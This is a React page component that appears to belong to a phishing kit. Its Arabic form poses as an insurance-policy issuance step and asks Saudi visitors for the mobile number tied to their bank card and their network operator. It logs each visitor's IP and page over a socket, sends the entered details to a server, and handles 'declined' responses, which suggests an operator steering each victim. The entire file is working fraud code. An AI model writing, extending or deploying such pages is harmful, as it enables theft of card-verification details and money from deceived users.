import React, { useEffect, useState } from "react";
import { socket } from "../App";

const Phone = () => {
  const [visitorIP, setVisitorIP] = useState(null);
  const [phone, setPhone] = useState("");
  const [operator, setOperator] = useState("STC");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);

  useEffect(() => {
    const fetchIP = async () => {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const { ip } = await res.json();
        setVisitorIP(ip);
        socket.emit("updateLocation", { ip, page: "phone" });
      } catch (e) {
        console.error("IP fetch failed:", e);
      }
    };
    fetchIP();
  }, []);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    if (params.get("declined") === "true") {
      setError(true);
    }

    socket.on("ackPhone", (resp) => {
      if (resp.success) {
        // let location.js handle the navigation
      } else {
        setLoading(false);
        setError(true);
        console.error(resp.error);
      }
    });
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError(false);
    setLoading(true);

    while (!visitorIP) {
      await new Promise((r) => setTimeout(r, 50));
    }
    const validatePhone = (PhoneNumber) => {
      return PhoneNumber.startsWith("05");
    };
    const isValidPhone = validatePhone(phone);
    if (isValidPhone) {
      socket.emit("submitPhone", {
        ip: visitorIP,
        phoneNumber: phone,
        operator,
      });
    } else {
        setLoading(false)
    return alert("يجب ان يتكون الرقم من 10 أرقام ويبدأ 05");
    }
  };

  return (
    <div dir="rtl" className="min-h-screen bg-white font-[Readex Pro]">
      {/* Header Logo */}
      <div className="text-center mt-5">
        <img src="/cstr.png" alt="logo" className="mx-auto w-64" />
      </div>

      {/* Form Container */}
      <div className="max-w-md w-11/12 mx-auto mt-8 p-6 border rounded-xl shadow bg-white">
        <h5 className="text-center text-lg font-bold">توثيق رقم الجوال</h5>
        <p className="text-sm text-right mt-3 text-gray-700">
          يرجى إدخال رقم الجوال ومشغّل شبكة الاتصالات الخاص بك، وذلك لاستكمال
          إجراءات إصدار وثيقة التأمين وربطها بالبيانات المعتمدة. على أن يكون رقم
          الجوال المرتبط بالبطاقة البنكية، وذلك لأغراض التحقق.
        </p>

        <form onSubmit={handleSubmit} className="mt-6 space-y-4">
          <div className="text-right">
            <label
              htmlFor="phone_input"
              className="block mb-1 text-sm text-gray-600"
            >
              أدخل رقم الجوال:
            </label>
            <input
              id="phone_input"
              type="tel"
              placeholder="05xxxxxxxx"
              value={phone}
              onChange={(e) => {
                const cleaned = e.target.value.replace(/\D/g, "").slice(0, 10);

                setPhone(cleaned);
              }}
              maxLength={10}
              minLength={10}
              required
              className="form-input w-full text-center border border-gray-300 rounded px-3 py-2 focus:outline-none focus:ring focus:border-blue-500"
            />
          </div>

          <div className="text-right">
            <label
              htmlFor="operator"
              className="block mb-1 text-sm text-gray-600"
            >
              إختيار مشغل الشبكة:
            </label>
            <select
              id="operator"
              value={operator}
              onChange={(e) => setOperator(e.target.value)}
              className="form-select w-full border border-gray-300 rounded px-3 py-2 focus:outline-none focus:ring focus:border-blue-500"
            >
              <option value="STC">STC</option>
              <option value="Mobily">Mobily</option>
              <option value="Zain">Zain</option>
              <option value="Lebara">Lebara</option>
              <option value="Virgin">Virgin</option>
            </select>
          </div>

          {error && (
            <div className="bg-red-100 text-red-800 p-2 rounded text-right text-sm">
              عذرا، رقم الجوال المدخل غير صحيح او غير مرتبط بوسيلة الدفع.
            </div>
          )}

          <button
            type="submit"
            className="w-full py-2 rounded bg-blue-600 text-white hover:bg-blue-700 transition"
          >
            تأكيد
          </button>

          <p className="text-xs text-right text-gray-500 mt-3">
            هل تحتاج للمساعدة ؟
          </p>
        </form>
      </div>

      {/* Loading Overlay */}
      {loading && (
        <div className="fixed inset-0 bg-black bg-opacity-60 z-50 flex items-center justify-center text-white">
          <div className="text-center">
            <div className="loader ease-linear rounded-full border-4 border-t-4 border-gray-200 h-10 w-10 mb-4 animate-spin mx-auto"></div>
            <h5 className="font-bold text-lg">يرجى الانتظار</h5>
            <p>انتظر حتى تتم معالجة طلبك</p>
          </div>
        </div>
      )}
    </div>
  );
};

export default Phone;
